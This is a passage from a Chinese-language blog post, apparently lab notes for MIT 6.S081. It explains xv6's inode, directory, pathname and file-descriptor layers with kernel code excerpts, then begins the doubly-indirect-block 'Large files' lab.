class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/fs.h</span></span><br><span class="line"><span class="comment">// On-disk inode structure</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dinode</span> &#123;</span></span><br><span class="line">  <span class="type">short</span> type;           <span class="comment">// File type</span></span><br><span class="line">  <span class="type">short</span> major;          <span class="comment">// Major device number (T_DEVICE only)</span></span><br><span class="line">  <span class="type">short</span> minor;          <span class="comment">// Minor device number (T_DEVICE only)</span></span><br><span class="line">  <span class="type">short</span> nlink;          <span class="comment">// Number of links to inode in file system</span></span><br><span class="line">  uint size;            <span class="comment">// Size of file (bytes)</span></span><br><span class="line">  uint addrs[NDIRECT+<span class="number">1</span>];   <span class="comment">// Data block addresses</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/file.h</span></span><br><span class="line"><span class="comment">// in-memory copy of an inode</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">  uint dev;           <span class="comment">// Device number</span></span><br><span class="line">  uint inum;          <span class="comment">// Inode number</span></span><br><span class="line">  <span class="type">int</span> ref;            <span class="comment">// Reference count</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> <span class="title">lock</span>;</span> <span class="comment">// protects everything below here</span></span><br><span class="line">  <span class="type">int</span> valid;          <span class="comment">// inode has been read from disk?</span></span><br><span class="line"></span><br><span class="line">  <span class="type">short</span> type;         <span class="comment">// copy of disk inode</span></span><br><span class="line">  <span class="type">short</span> major;</span><br><span class="line">  <span class="type">short</span> minor;</span><br><span class="line">  <span class="type">short</span> nlink;</span><br><span class="line">  uint size;</span><br><span class="line">  uint addrs[NDIRECT+<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>这里在特别分析一下<strong>inode</strong>如何表示<strong>文件/目录项</strong>，如下图所示<br><img src="inode.png" alt="inode示意图">。其数据在<strong>addrss1-address12</strong>和<strong>indirect</strong>所指向的<strong>data block</strong>中，但是存储的都是<strong>block</strong>块号，需要在具体的转换为<strong>block</strong>中数据才行</p><p>而<strong>xv6</strong>使用位于<strong>kernel/fs.c</strong>的<strong>icache</strong>结构描述<strong>inode</strong>缓冲，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> <span class="title">inode</span>[<span class="title">NINODE</span>];</span></span><br><span class="line">&#125; icache;</span><br></pre></td></tr></table></figure></p><h4 id="iget"><a href="#iget" class="headerlink" title="iget()"></a>iget()</h4><p>在<strong>xv6</strong>中，<strong>Inode Layer</strong>的经典用法如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip = iget(dev, inum)</span><br><span class="line">ilock(ip)</span><br><span class="line">... example and modify ip-&gt;XXX ...</span><br><span class="line">iunlock(ip)</span><br><span class="line">iput(ip)</span><br></pre></td></tr></table></figure></p><p><strong>xv6</strong>使用位于<strong>kernel/fs.c</strong>的<strong>iget()</strong>函数，在<strong>inode</strong>缓冲中分配对应的<strong>inode</strong></p><p>根据前面的分析，如果该<strong>inode</strong>已经被缓存，则添加<strong>引用计数ref</strong>即可；否则找到可以覆盖的<strong>inode</strong>缓冲，并初始化即可</p><p>需要特别注意的是，在<strong>iget()</strong>函数中并不会实际载入磁盘中的数据，仅仅初始化<strong>in-memory</strong>的<strong>inode</strong>中必要的数据结构而已</p><h4 id="ilock"><a href="#ilock" class="headerlink" title="ilock()"></a>ilock()</h4><p><strong>xv6</strong>使用位于<strong>kernel/fs.c</strong>的<strong>ilock()</strong>函数，从而方便进程互斥的访问<strong>inode</strong>。一般当进程需要上锁时，则表明需要读、写资源，也就是进程会访问或更改<strong>inode</strong>数据，因此这里会将<strong>inode</strong>的<strong>on-disk</strong>数据加载到内存中，方便后续的操作</p><p>需要说明的是，这里仅仅加载<strong>inode</strong>的<strong>控制信息</strong>和部分<strong>数据信息</strong>，<strong>inode</strong>的所有数据信息都会通过<strong>bmap()</strong>函数，获取数据对应的<strong>block</strong>号，在使用<strong>bget()</strong>进行访问即可</p><h4 id="iput"><a href="#iput" class="headerlink" title="iput()"></a>iput()</h4><p><strong>xv6</strong>使用位于<strong>kernel/fs.c</strong>的<strong>iput()</strong>函数，释放<strong>inode</strong>，即减少<strong>inode</strong>的引用计数即可</p><p>需要特别注意的是，当<strong>inode</strong>的引用计数为0时，则表明此时对于<strong>inode</strong>表示的文件或目录操作结束，此时应当判断一下该文件是否应该被删除，即判断<strong>nlink</strong>字段是否为0，从而完成相关的删除操作即可</p><h2 id="Directory-Layer"><a href="#Directory-Layer" class="headerlink" title="Directory Layer"></a>Directory Layer</h2><h3 id="设计-4"><a href="#设计-4" class="headerlink" title="设计"></a>设计</h3><p><strong>Directory Layer</strong>是用来抽象文件系统中的目录</p><p>实际上，目录就是一种特殊的文件——其内容就是一系列的<strong>目录项</strong>序列</p><p>一般来说，每一个<strong>目录项</strong>包含目录项的名称和目录项指向的文件<strong>inode</strong>的<strong>block</strong>块号，从而可以很好的抽象目录</p><h3 id="实现-4"><a href="#实现-4" class="headerlink" title="实现"></a>实现</h3><h4 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h4><p>正如前面分析的，<strong>目录</strong>是一种<strong>特殊</strong>的<strong>文件</strong>，所以<strong>xv6</strong>也使用位于<strong>kernel/fs.h</strong>的<strong>struct dinode</strong>和位于<strong>kernel/file.h</strong>的<strong>struct inode</strong>进行描述</p><p>但由于<strong>目录</strong>中的数据内容都是<strong>目录项</strong>，<strong>xv6</strong>使用位于<strong>kernel/fs.h</strong>的<strong>struct dirent</strong>描述<strong>目录项</strong></p><h4 id="dirlookup"><a href="#dirlookup" class="headerlink" title="dirlookup()"></a>dirlookup()</h4><p><strong>Directory Layer</strong>中最重要的，即在<strong>目录</strong>中找到对应的<strong>目录项</strong>。<strong>xv6</strong>使用位于<strong>kernel/fs.c</strong>的<strong>dirlookup()</strong>来实现该功能</p><p>其逻辑也很简单，也就是以<strong>目录项</strong>的格式，依次遍历当前<strong>目录</strong>数据即可</p><h2 id="Pathname-Layer"><a href="#Pathname-Layer" class="headerlink" title="Pathname Layer"></a>Pathname Layer</h2><h3 id="设计-5"><a href="#设计-5" class="headerlink" title="设计"></a>设计</h3><p><strong>Pathname Layer</strong>用来将<strong>human-friendly</strong>的路径，转换为<strong>Machine-friendly</strong>的<strong>Inode Layer</strong>的<strong>Inode</strong></p><p>在直白一些，就是将<strong>树状</strong>文件系统，转换为<strong>on-disk</strong>文件系统。操作系统通过迭代查找<strong>目录</strong>，从而将<strong>路径信息</strong>转换为对应的<strong>inode</strong>，方便后续操作</p><h3 id="实现-5"><a href="#实现-5" class="headerlink" title="实现"></a>实现</h3><h4 id="namex"><a href="#namex" class="headerlink" title="namex()"></a>namex()</h4><p>正如前面分析的，<strong>Pathname Layer</strong>主要就是通过迭代目录，从而转化为对应文件的<strong>inode</strong></p><p><strong>xv6</strong>通过<strong>namex()</strong>，非常精巧的实现了该要求。其<strong>namex()</strong>函数的定义就非常巧妙，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Look up and return the inode for a path name.</span></span><br><span class="line"><span class="comment">// If parent != 0, return the inode for the parent and copy the final</span></span><br><span class="line"><span class="comment">// path element into name, which must have room for DIRSIZ bytes.</span></span><br><span class="line"><span class="comment">// Must be called inside a transaction since it calls iput().</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> inode*</span><br><span class="line"><span class="title function_">namex</span><span class="params">(<span class="type">char</span> *path, <span class="type">int</span> nameiparent, <span class="type">char</span> *name)</span></span><br></pre></td></tr></table></figure></p><p>即如果要查找父目录，则<strong>namex()</strong>返回父目录的<strong>inode</strong>，而<strong>name</strong>则被设置为剩余的路径元素信息，方便后续的文件查找；如果要查找的是该文件，则<strong>namex()</strong>直接返回该文件的<strong>inode</strong>，而<strong>name</strong>则被设置为<strong>NULL</strong></p><p>这个<strong>API</strong>极大的拓展了<strong>Pathname Layer</strong>的灵活性，其实现也非常巧妙，特别是<strong>skipelem()</strong>的实现，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/fs.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Copy the next path element from path into name.</span></span><br><span class="line"><span class="comment">// Return a pointer to the element following the copied one.</span></span><br><span class="line"><span class="comment">// The returned path has no leading slashes,</span></span><br><span class="line"><span class="comment">// so the caller can check *path==&#x27;\0&#x27; to see if the name is the last one.</span></span><br><span class="line"><span class="comment">// If no name to remove, return 0.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Examples:</span></span><br><span class="line"><span class="comment">//   skipelem(&quot;a/bb/c&quot;, name) = &quot;bb/c&quot;, setting name = &quot;a&quot;</span></span><br><span class="line"><span class="comment">//   skipelem(&quot;///a//bb&quot;, name) = &quot;bb&quot;, setting name = &quot;a&quot;</span></span><br><span class="line"><span class="comment">//   skipelem(&quot;a&quot;, name) = &quot;&quot;, setting name = &quot;a&quot;</span></span><br><span class="line"><span class="comment">//   skipelem(&quot;&quot;, name) = skipelem(&quot;////&quot;, name) = 0</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span>*</span><br><span class="line"><span class="title function_">skipelem</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(*path == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    path++;</span><br><span class="line">  <span class="keyword">if</span>(*path == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  s = path;</span><br><span class="line">  <span class="keyword">while</span>(*path != <span class="string">&#x27;/&#x27;</span> &amp;&amp; *path != <span class="number">0</span>)</span><br><span class="line">    path++;</span><br><span class="line">  len = path - s;</span><br><span class="line">  <span class="keyword">if</span>(len &gt;= DIRSIZ)</span><br><span class="line">    memmove(name, s, DIRSIZ);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    memmove(name, s, len);</span><br><span class="line">    name[len] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span>(*path == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    path++;</span><br><span class="line">  <span class="keyword">return</span> path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Look up and return the inode for a path name.</span></span><br><span class="line"><span class="comment">// If parent != 0, return the inode for the parent and copy the final</span></span><br><span class="line"><span class="comment">// path element into name, which must have room for DIRSIZ bytes.</span></span><br><span class="line"><span class="comment">// Must be called inside a transaction since it calls iput().</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> inode*</span><br><span class="line"><span class="title function_">namex</span><span class="params">(<span class="type">char</span> *path, <span class="type">int</span> nameiparent, <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>, *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(*path == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    ip = iget(ROOTDEV, ROOTINO);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    ip = idup(myproc()-&gt;cwd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((path = skipelem(path, name)) != <span class="number">0</span>)&#123;</span><br><span class="line">    ilock(ip);</span><br><span class="line">    <span class="keyword">if</span>(ip-&gt;type != T_DIR)&#123;</span><br><span class="line">      iunlockput(ip);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(nameiparent &amp;&amp; *path == <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">      <span class="comment">// Stop one level early.</span></span><br><span class="line">      iunlock(ip);</span><br><span class="line">      <span class="keyword">return</span> ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((next = dirlookup(ip, name, <span class="number">0</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">      iunlockput(ip);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    iunlockput(ip);</span><br><span class="line">    ip = next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(nameiparent)&#123;</span><br><span class="line">    iput(ip);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>即<strong>skipelem()</strong>在迭代路径时，提供了一次迭代所需要的充足信息，所以实现的逻辑非常清晰和优雅，值得好好学习!</p><h2 id="File-Descriptor-Layer"><a href="#File-Descriptor-Layer" class="headerlink" title="File Descriptor Layer"></a>File Descriptor Layer</h2><h3 id="设计-6"><a href="#设计-6" class="headerlink" title="设计"></a>设计</h3><p><strong>File Descriptor Layer</strong>用来将操作系统的各种资源(例如<strong>pipes</strong>、<strong>devies</strong>等)抽象为统一的系统接口——<strong>File Descriptor</strong></p><p>操作系统一般会给每个进程一个独立的打开文件表，其中每一个都是资源(例如<strong>inode</strong>、<strong>device</strong>等)的包装。而这些打开文件表的表项，都被操作系统全局的文件表维护</p><h3 id="实现-6"><a href="#实现-6" class="headerlink" title="实现"></a>实现</h3><h4 id="结构-1"><a href="#结构-1" class="headerlink" title="结构"></a>结构</h4><p><strong>xv6</strong>使用位于<strong>kernel/file.h</strong>的<strong>struct file</strong>描述<strong>File Descriptor</strong>接口，使用位于<strong>kernel/proc.h</strong>的<strong>proc-&gt;ofile</strong>描述进程的打开文件，使用位于<strong>kernel/file.c</strong>的<strong>ftable</strong>描述操作系统中所有的打开文件，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/file.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> &#123;</span> FD_NONE, FD_PIPE, FD_INODE, FD_DEVICE &#125; type;</span><br><span class="line">  <span class="type">int</span> ref; <span class="comment">// reference count</span></span><br><span class="line">  <span class="type">char</span> readable;</span><br><span class="line">  <span class="type">char</span> writable;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe</span> *<span class="title">pipe</span>;</span> <span class="comment">// FD_PIPE</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span>  <span class="comment">// FD_INODE and FD_DEVICE</span></span><br><span class="line">  uint off;          <span class="comment">// FD_INODE</span></span><br><span class="line">  <span class="type">short</span> major;       <span class="comment">// FD_DEVICE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/proc.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span>        <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>         <span class="comment">// Parent process</span></span><br><span class="line">  <span class="type">void</span> *chan;                  <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="type">int</span> killed;                  <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="type">int</span> xstate;                  <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="type">int</span> pid;                     <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="type">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/file.c</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> <span class="title">file</span>[<span class="title">NFILE</span>];</span></span><br><span class="line">&#125; ftable;</span><br></pre></td></tr></table></figure></p><h1 id="Lab-file-system"><a href="#Lab-file-system" class="headerlink" title="Lab file system"></a>Lab file system</h1><p>本次<a href="https://pdos.csail.mit.edu/6.828/2020/labs/fs.html">lab</a>用来加深对于<strong>xv6</strong>的<strong>文件系统</strong>机制的理解</p><h2 id="Large-files"><a href="#Large-files" class="headerlink" title="Large files"></a>Large files</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><blockquote><p>Modify <strong>bmap()</strong> so that it implements a doubly-indirect block, in addition to direct blocks and a singly-indirect block. You’ll have to have only 11 direct blocks, rather than 12, to make room for your new doubly-indirect block; you’re not allowed to change the size of an on-disk inode. The first 11 elements of <strong>ip-&gt;addrs[]</strong> should be direct blocks; the 12th should be a singly-indirect block (just like the current one); the 13th should be your new doubly-indirect block. You are done with this exercise when <strong>bigfile</strong> writes 65803 blocks and <strong>usertests</strong> runs successfully: </p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>如果要添加<strong>inode</strong>的<strong>doubly-indirect block</strong>的支持，则参考下图，更改所有涉及<strong>inode</strong>的<strong>data block</strong>的数据结构和操作即可<br><img src="inode.png" alt="inode示意图"></p><p>总的来说，涉及到<strong>inode</strong>的<strong>data block</strong>细节的，只有<strong>on-disk</strong>的<strong>struct dinode</strong>结构和<strong>in-memory</strong>的<strong>struct inode</strong>，相关的宏以及获取<strong>data block</strong>块号的<strong>bmap()</strong>和清空<strong>data block</strong>的<strong>itrunc()</strong></p><h3 id="实现-7"><a href="#实现-7" class="headerlink" title="实现"></a>实现</h3><p>首先，我们将<strong>inode</strong>的<strong>data block</strong>布局，更改为<strong>11</strong>个<strong>direct block</strong>、<strong>1</strong>个<strong>indirect block</strong>和<strong>1</strong>个<strong>doubly indirect block</strong>，即更改<strong>struct dinode</strong>和<strong>struct inode</strong>的<strong>arrays</strong>字段，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/fs.h</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NDIRECT     11                                <span class="comment">//Number of direct data block</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NINDE       1                                 <span class="comment">//Number of indirect data entries</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBPIND      (BSIZE / sizeof(uint))            <span class="comment">//Number of data block per indirect entry</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NINDIRECT   (NINDE * NBPIND)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NDINDE      1                                 <span class="comment">//Number of doubly indirect data enties</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NINDEPDIND  (BSIZE / sizeof(uint))            <span class="comment">//Number of indirect data entries per doubly indirect entry</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NBPDIND     (NINDEPDIND * NBPIND)             <span class="comment">//Number of data block per doubly indirect entry</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NDINDIRECT  (NDINDE * NBPDIND)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXFILE     (NDIRECT + NINDIRECT + NDINDIRECT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// On-disk inode structure</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dinode</span> &#123;</span></span><br><span class="line">  <span class="type">short</span> type;           <span class="comment">// File type</span></span><br><span class="line">  <span class="type">short</span> major;          <span class="comment">// Major device number (T_DEVICE only)</span></span><br><span class="line">  <span class="type">short</span> minor;          <span class="comment">// Minor device number (T_DEVICE only)</span></span><br><span class="line">  <span class="type">short</span> nlink;          <span class="comment">// Number of links to inode in file system</span></span><br><span class="line">  uint size;            <span class="comment">// Size of file (bytes)</span></span><br><span class="line">  uint addrs[NDIRECT+NINDE+NDINDE];   <span class="comment">// Data block addresses</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/file.h</span></span><br><span class="line"><span class="comment">// in-memory copy of an inode</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">  uint dev;           <span class="comment">// Device number</span></span><br><span class="line">  uint inum;          <span class="comment">// Inode number</span></span><br><span class="line">  <span class="type">int</span> ref;            <span class="comment">// Reference count</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> <span class="title">lock</span>;</span> <span class="comment">// protects everything below here</span></span><br><span class="line">  <span class="type">int</span> valid;          <span class="comment">// inode has been read from disk?</span></span><br><span class="line"></span><br><span class="line">  <span class="type">short</span> type;         <span class="comment">// copy of disk inode</span></span><br><span class="line">  <span class="type">short</span> major;</span><br><span class="line">  <span class="type">short</span> minor;</span><br><span class="line">  <span class="type">short</span> nlink;</span><br><span class="line">  uint size;</span><br><span class="line">  uint addrs[NDIRECT+NINDE+NDINDE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>其次来重构<strong>bmap()</strong>函数，其思路非常简单——由于<strong>inode</strong>的<strong>data block</strong>按照<strong>direct block</strong>、<strong>indirect block</strong>和<strong>doubly indirect block</strong>顺序排列，可以简单理解为将一维数组的下标解析为三维数组的坐标</p><p>对于<strong>direct block</strong>，其<strong>arrays</strong>数组中存储的就是<strong>data block</strong>的块号，则直接返回即可；对于<strong>indirect block</strong>，其<strong>arrays</strong>数组中存储的是<strong>direct block</strong>的块号，还需要再载入<strong>direct block</strong>块这一个步骤；类似的，对于<strong>doubly indirect block</strong>，其<strong>arrays</strong>数组中存储的时<strong>indirect block</strong>块号，还需要再载入<strong>indirect block</strong>、接着载入<strong>direct block</strong>块两个步骤，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span 